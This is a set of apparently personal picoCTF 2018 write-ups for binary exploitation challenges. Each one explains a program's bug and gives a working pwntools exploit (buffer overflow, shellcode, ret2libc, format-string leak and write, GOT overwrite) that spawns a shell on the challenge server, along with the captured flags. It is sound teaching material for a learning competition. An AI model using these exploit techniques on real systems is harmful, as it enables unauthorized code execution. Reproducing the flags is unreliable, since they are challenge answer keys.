
	
===================================================================
Buffer Overflow 0
	Write Up :
 		
 		Program Flow:
 			1. If argc > 1, then main calls vuln(argv[1])
 			2. argv[1] copied into buf[16] with strcpy(0, can cause overflow

 		Exploit:
 			./vuln AAAAAAAAAAAAAAAABBBB

	Flag : 
		picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}


===================================================================
Buffer Overflow 1
	Write Up :
 		
 		Program Flow:
 			Inside vuln()
 				1.Allocates 0x88 (136 bytes) for user input without	
 				checks on length (gets() used)
 				2. Can lead to buffer overflow and the return address of vuln() can be overwritten with an offset of 140 bytes (136 to fill the buffer, 4 to overwrite EBP, new return address)



 		Exploit:
 	

	Flag : 
	


===================================================================
leak-me
		
	Write Up:
		Program Flow:
			Takes in 2 user inputs, name and password
			Uses fgets for name (takes in 256 chars for name)
			Searches name for '\n' with strchr()
				If it exists, change it to '\x00'
			Prints out name
			Gets user input for the password
			If password is correct, then the flag is outputted in flag()


		Bug:
			 When using strchr(), if the whole array is filled with chars (256 chars), then '\n' will not be inside name, which prevents the program from NULL terminating the string name. Since the string is not NULL terminated, using puts(name) will output the name and whatever is next to it on the stack (until it reaches another NULL termination)

			 In this case, password[] is right above the name[] in the stack, so when name is outputted, it will output both name[] and password[] and will be NULL terminated by the password[]


		Expliot:

			from pwn import *

			r = remote('2018shell.picoctf.com', 57659)
			#r = process ('./auth')

			exploit = 256*"A"
			r.sendlineafter("What is your name?", exploit)
			r.recvuntil(",")
			password = r.recvline()
			password = password[:-1]

			r = remote('2018shell.picoctf.com', 57659)

			r.sendlineafter("What is your name?", "name")
			r.sendlineafter(",", password)
			r.interactive()

		Flag:
			picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_2b5cbbaa}
===================================================================
shellcode

	Write Up:

		Expliot:

			from pwn import *
			#r = remote('2018shell.picoctf.com', 57659)
			#r = process ('./shellcode')
			s = ssh(host='2018shell.picoctf.com', user='int0x80', password='OMITTED')
			r = s.run('cd /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd; ./vuln')


			#To set up execve() and '/bin/sh'
			# execve takes 3 arguements
			# int execve (const char *filename, char *const argv[], char *const envp[])
			# *filename = '/bin/sh'+ \x00 = ebx
			# *const argv = NULL = edx
			# *const envp = pointer to address of *filename = ecx

			# shellcode = asm('mov eax, 0')
			# shellcode += asm('push eax') #NULL terminating
			# shellcode += asm('push 0x68732f6e') #/sh
			# shellcode += asm('push 0x69622f2f') #/bin
			# shellcode += asm('move ebx, esp') #move pointer to '/bin/sh\x00' ebx

			# shellcode += asm('push eax') #push NULL
			# shellcode += asm('mov edx, esp') # move esp (pointing at NULL) to edx

			# shellcode += asm('push ebx') #push address of string
			# shellcode += asm('mov ecx, esp') #move esp (pointer to addrss of stirng) to ecx

			#shellcode += asm('mov eax, 11') #sys call refernce is 0xb /11
			#shellcode += asm(int 0x80)

			test = asm(shellcraft.sh())

			r.send(test)
			r.interactive()

		Flag:
			picoCTF{shellc0de_w00h00_b766002c}


===================================================================
got-2-learn-libc

	Write Up:
		Program Flow:

			The name of the challenge tells us that it will involve using functions from the libc library.
			main() prints out addresses of different functions and the address of the string '/bin/sh'. 

			vuln() gets user input with puts(), causing a buffer overflow vulnerability as it is saved in buf[] which is 148 bytes. However, looking at the binary

				0x565557a4 <+4>:	sub    esp,0xa4

			We see that the frame for this functino is actually 0xa4 (164) which means 

				160 bytes + 4 bytes (EBP) + address system() + fake-ret-addr+string

			This will spawn us a shell. 

			To get the address of system, we can use the addresses that are printed, which we then use to calculate the offset from those to the system() function.

			Using https://libc.blukat.me/, we find that 
			puts() is 0x24800 bytes further than system()
			So &system = &puts - 0x24800


		Expliot:

			from pwn import *

			#r = remote('2018shell.picoctf.com', 57659)
			#r = process ('./got-2-learn-libc')
			#r = gdb.debug('./got-2-learn-libc', ''' b*vuln+97''')
			s = ssh(host='2018shell.picoctf.com', user='int0x80', password='')
			r = s.run('cd /problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f; ./vuln')

			r.recvuntil("puts:")
			puts = r.recvline()
			puts = int(puts[:-1], 16)

			r.recvuntil("useful_string:")
			binsh = r.recvline()
			binsh = int(binsh[:-1],16)

			system = puts - 0x24800

			exploit = 160*b"A" + p32(system) + b"AAAA"+ p32(binsh)

			r.sendline(exploit)

			r.interactive()


		Flag:
			picoCTF{syc4al1s_4rE_uS3fUl_b61928e8}


===================================================================
echoooo

	Write Up:

		Program Flow:

			buf[64] is directly above the flag[64] on the stack and is directly above the pointer to the flag.

			This means that the address for the flag is definitely on the stack, which also means that we can brute force (the offset) on the stack until we read the flag

			By stepping through the program in GDB, especially at line 32
				fgets(flag, sizeof(flag), file);
			We can look at the registers (EAX especially as thats the address of the flag)

				0x08048707 <+268>:	push   DWORD PTR [ebp-0x90]
				0x0804870d <+274>:	push   0x40
				0x0804870f <+276>:	lea    eax,[ebp-0x4c]
				0x08048712 <+279>:	push   eax
				0x08048713 <+280>:	call   0x8048460 <fgets@plt>

			Putting a break point at main+280 will allow us to inspect all the registers right before fgets() is called

			The flag is at 0xffffd17c

			As we know that there is a format string, we can use it to leak some information about the stack

			Using this as input
				AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.


			The program outputs

				AAAA0x40.0xf7ebd5c0.0x8048647.0xf7ee5409.0xf63d4e2e.0xf7f03af8.0xffbad794.0xffbad69c.0x3e8.0x9639160.0x41414141.

			So we can see that the the beginning of our buf is 12 bytes above the current stack pointer. So if instead of inputing AAAA, we input the address of flag[], we can use the format string vulnerability to read from that address.

			

		Bugs:
			Incorrect use of printf() and printing the value directly leading to a format string vulnerability

		Expliot:

			Clean: p32(0xffffd17c) + b'%11$s'
			Simple:

				for i in range (100):
					try:
						#r = process ('./echo')
						r = remote('2018shell.picoctf.com', 3981)
						r.sendlineafter('> ', '%{}$s'.format(i))
						print (r.recvuntil('>'))
						r.close()

					except EOFError:
						pass

		Flag:
			picoCTF{foRm4t_stRinGs_aRe_DanGer0us_36de83c4}

===================================================================
Authenticate

	Write Up:

		Program Flow:

			Takes in user input (anything other than no will cause the program to attempt to read the flag)
			The program uses a boolean 'authenticated', which is iniated as 0 to determinte whether the user can read the flag (calls flag() is boolean is TRUE)

			read_flag() does the check for authenticated so if we look at the registers, we can see where authenticated is stored.
			read_flag():

				0x080486ea <+6>:	mov    eax,ds:0x804a04c
	   			0x080486ef <+11>:	test   eax,eax

	   		At read_flag+6, we can see that the value at 0x804a04c is moved to eax and checked, which tells us this is where authenticated is checked. This also tells us that 0x804a04c holds the value for authenticated, so we can use the format string vulnerability to write to this address in memory from False to True, passing the check and printing the flag. 

	   		Input:
	   			AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.

	   		Output:
	   			AAAA.0x80489a6.0xf7f4f5c0.0x804875a.(nil).0xc30000.(nil).0xffddd954.(nil).(nil).0x3e8.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.

	   		We can see that our input buf starts at the 11th address. So instead of using AAAA, we used 0x804a04c, we can write any value (as long it changes from 0) to this address, 'authenticating' us.



		Bugs:
			Incorrect use of printf() and printing the value directly leading to a format string vulnerability



		Exploit:
			from pwn import *

			r = remote('2018shell.picoctf.com', 52398)
			#r = process ('./authenticate')

			authenticate = p32(0x804a04c)

			exploit = authenticate + b'%11$n'
			r.sendline(exploit)
			r.interactive()


		Flag:
			picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_0bec1698}


===================================================================
Got shell

	Write Up:

		Program Flow:
			Takes user input and saves it at user specified address.
			win() is provided

			Find the pointer to exit() (in the GOT) and overwrite it with win()

				Dump of assembler code for function exit@plt:
				   0x080483f0 <+0>:		jmp    DWORD PTR ds:0x804a014
				   0x080483f6 <+6>:		push   0x10
				   0x080483fb <+11>:	jmp    0x80483c0

			We can overwrite 0x804a014 with the address of win() which is 
			0x0804854b

			However, since the input is saved with
				scanf("%x", &address);
				scanf("%x", &value);

			We can't send the addresses as bytes, but instead as an int.

		Expliot:

			from pwn import *

			r = remote('2018shell.picoctf.com', 23731)
			#r = process ('./gotshell')

			exit = '0804a014'
			win = '0804854b'

			r.sendline(exit)
			r.sendline(win)
			r.interactive()

		Flag:
			picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}


===================================================================
Echo Back	

	Write Up:

		Program Flow:
			main() calls on vuln()
			This shows that the stack if 0x94 (148) bytes and that vuln() uses a canary, stored at ebp-0xc
				0x080485af <+4>:	sub    esp,0x94
				0x080485b5 <+10>:	mov    eax,gs:0x14
				0x080485bb <+16>:	mov    DWORD PTR [ebp-0xc],eax


			and is checked 

				   0x08048630 <+133>:	xor    eax,DWORD PTR gs:0x14
				   0x08048637 <+140>:	je     0x804863e <vuln+147>
				   0x08048639 <+142>:	call   0x8048430 <__stack_chk_fail@plt>

			This shows that if we are to overflow the buffer, we will have to somehow leak the canary  first. 

			system() is used to echo the message "input your message:"

			However, user input is being controlled with read(), so we will not be able to use a buffer overflow vulnerability. 
			Also using checksec:

				Arch:     i386-32-little
			    RELRO:    Partial RELRO
			    Stack:    Canary found
			    NX:       NX enabled
			    PIE:      No PIE

			NX is also enabled so using shellcode won't be possible.

			Running the program shows that the printf() in vuln is vulnerable to format string vulnerabilities.

				input your message:
				%p.%p.%p.%p.%p.%p.%p.%p.
				0xffbb550c.0x7f.0xf7e37566.0xf7fc3e89.0x1.(nil).0x252e7025.0x70252e70.


				Thanks for sending the message!

			So a potential exploit would be to overwrite one of the function address in GOT to system().

				input your message:
				AAAA.%p.%p.%p.%p.%p.%p.%p.%p.
				AAAA.0xffbd2b2c.0x7f.0xf7da2566.0xf7f2ee89.0x1.(nil).0x41414141.0x2e70252e.


				Thanks for sending the message!

			We can see that the 7th value on the stack is the start of the buffer, so we can put the address of puts() into the stack and overwrite it with the address of system.

			However, the challenge now is to be able to pass the correct arguement 'bin/sh' into system() to spawn a shell. 

			We know that vuln() uses read() to take in user input and then uses printf() to print out the same input to stdout.

				0x080485e9 <+62>:	lea    eax,[ebp-0x8c]
				0x080485ef <+68>:	push   eax
				0x080485f0 <+69>:	push   0x0
				0x080485f2 <+71>:	call   0x8048410 <read@plt>
				0x080485f7 <+76>:	add    esp,0x10
				0x080485fa <+79>:	sub    esp,0xc
				0x080485fd <+82>:	lea    eax,[ebp-0x8c]
				0x08048603 <+88>:	push   eax
				0x08048604 <+89>:	call   0x8048420 <printf@plt>

			This shows us that if we overwrite printf() with system(), vuln() will pass whatever read() takes in, and uses it as an arguement for system().

			Steps:
				1. Ovewrite puts() in GOT with vuln() and ovewrite printf() with system()
				2. The program will jump back to the start of vuln()
				3. Use read() to input '/bin/sh'
				4. Program will pass this string onto system() which was originally printf()

			Comparing the addresses of puts() and vuln(), only the last 2 bytes are different so we can use a half write 
				puts = 0x0804a01c
				vuln = 0x080485ab 

			For printf is even simpler as only the last byte is different, so we can just replace the last byte 
				printf  = 0x0804a010
				win 	= 0x08048460 

			However, using the PWNTOOLS's built in format string function, we just need to know the offset on the stack, the old and new address.

		Exploit:

			from pwn import *
			#r = remote('2018shell.picoctf.com', 26532)
			r = process ('./echoback')
			#r = gdb.debug('./echoback',''' b*vuln+89''')

			#puts 0x0804a01c -> vuln 0x080485ab
			#printf 0x0804a010 -> system 0x08048460

			puts = 0x0804a01c
			vuln = 0x080485ab

			printf  = 0x0804a010
			system 	= 0x08048460

			#manual way of overwriting GOT
			# exploit = p32(printf)+ p32(puts)
			# exploit += b"%33880x"+ b"%7$hn" 
			# exploit += b"%331x"+ b"%8$hn"
			#r.sendline(exploit)

			#Using pwntools built in function
			vuln_loop = fmtstr_payload(7, {puts:vuln})
			r.sendline(vuln_loop)

			print_2_sys = fmtstr_payload(7, {printf:system})
			r.sendline(print_2_sys)
			r.interactive()

		Flag:
			picoCTF{foRm4t_stRinGs_aRe_3xtra_DanGer0us_28d90596}